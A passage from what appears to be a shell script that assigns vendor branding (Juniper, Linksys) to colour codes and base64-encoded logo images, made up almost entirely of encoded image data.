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'
										["Juniper"]='#B4CFF1 #A8A8A8 #4A4A4A data:image/png;base64,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'
										["Linksys"]='#0065B4 #70A0D4 #BFBFBF data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgLTI0OCAzODkgMTE0IDE2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9Ii0yNDggMzg5IDExNCAxNiIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KCS5zdDB7ZmlsbDojMDAwO30KPC9zdHlsZT4KPHBvbHlnb24gY2xhc3M9InN0MCIgcG9pbnRzPSItMTY0LjYgNDA1IC0xNjAuNiA0MDUgLTE2MC42IDM5OS44IC0xNTMuNCAzODkgLTE1Ny44IDM4OSAtMTYyLjQgMzk2LjMgLTE2NyAzODkgLTE3MS43IDM4OSAtMTY0LjYgMzk5LjkiLz4KPHBvbHlnb24gY2xhc3M9InN0MCIgcG9pbnRzPSItMjAzLjUgMzk3IC0xOTQuOCAzODkgLTE4OS40IDM4OSAtMTk4LjEgMzk3IC0xODkuNCA0MDUgLTE5NC44IDQwNSIvPgo8cmVjdCBjbGFzcz0ic3QwIiB4PSItMjI5LjYiIHk9IjM4OSIgd2lkdGg9IjQuMSIgaGVpZ2h0PSIxNiIvPgoKCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0tMTg4LjUgNDA1aDEyLjhjMi4yIDAgMy43LTEuMiAzLjctMy44di0yLjJjMC0yLjMtMS4yLTMuOC0zLjctMy44aC05LjZ2LTNoMTIuNHYtMy4yaC0xMi42Yy0yLjMgMC0zLjcgMS4zLTMuNyAzLjh2MmMwIDIuMiAxLjMgMy43IDMuNyAzLjdoOS42djMuM2gtMTIuNnYzLjIiLz4KCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0tMTUzLjEgNDA1aDEzLjVjMi4yIDAgMy43LTEuMiAzLjctMy44di0yLjJjMC0yLjMtMS4yLTMuOC0zLjctMy44aC05LjZ2LTNoMTIuNHYtMy4yaC0xMi43Yy0yLjMgMC0zLjcgMS4zLTMuNyAzLjh2MmMwIDIuMiAxLjMgMy43IDMuNyAzLjdoOS42djMuM2gtMTMuMnYzLjIiLz4KCTxwb2x5Z29uIGNsYXNzPSJzdDAiIHBvaW50cz0iLTI0OCA0MDUgLTIzMi4xIDQwNSAtMjMyLjEgNDAxLjggLTI0My45IDQwMS44IC0yNDMuOSAzODkgLTI0OCAzODkiLz4KCTxwb2x5Z29uIGNsYXNzPSJzdDAiIHBvaW50cz0iLTIyMi40IDQwNSAtMjE4LjcgNDA1IC0yMTguNyAzOTMuNiAtMjA2LjYgNDA1IC0yMDQuMSA0MDUgLTIwNC4xIDM4OSAtMjA3LjggMzg5IC0yMDcuOCAzOTguNiAtMjE3LjkgMzg5IC0yMjIuNCAzODkiLz4KCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0tMTM1IDM4OS4yaC0wLjR2MWgtMC4ydi0xaC0wLjR2LTAuMmgwLjl2MC4yaDAuMXptMS40LTAuMmgtMC4ybC0wLjQgMC45LTAuNS0wLjloLTAuMn